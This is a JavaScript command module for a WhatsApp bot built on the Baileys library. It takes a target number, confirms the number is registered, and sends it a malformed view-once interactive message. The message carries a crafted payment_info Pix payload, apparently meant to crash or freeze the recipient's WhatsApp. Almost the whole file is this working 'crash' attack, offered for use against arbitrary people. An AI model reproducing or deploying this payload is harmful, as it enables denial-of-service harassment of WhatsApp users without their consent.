const fs = require('fs');
const { proto, prepareWAMessageMedia, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

exports.run = {
  usage: ['crash'],
  hidden: ['crash-ui'],
  use: 'crash',
  category: 'bug',
  async: async (context, { func, mecha, froms }) => {
    if (!froms) {
      return context.reply('Mention or reply chat target.');
    }

    const target = froms;

    // Check if the number starts with '08'
    if (target.startsWith('08')) {
      return context.reply('Awali nomor dengan +62');
    }

    // Check if the target is in the global developer list
    if ([...global.devs].includes(target)) {
      return context.reply('Tidak bisa spam bug ke nomor ini!');
    }

    let isValid = await mecha.onWhatsApp(target);
    if (isValid.length === 0) {
      return context.reply('Masukkan nomor yang valid dan terdaftar di WhatsApp!');
    }

    context.reply(`Proses sendbug to @${target.split('@')[0]}...`);

    async function sendBug(targetJid) {
      await mecha.relayMessage(
        targetJid,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
              },
              interactiveMessage: {
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: 'payment_info',
                      buttonParamsJson: '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"bug by @hwuwhw99","key":"+5533998586057","key_type":"X"}}]}'
                    }
                  ]
                }
              }
            }
          }
        },
        {
          participant: { jid: targetJid }
        },
        {
          messageId: null
        }
      );
    }

    await sendBug(target);
    await context.reply('Selesai sendbug tuan!');
  },
  devs: true
};
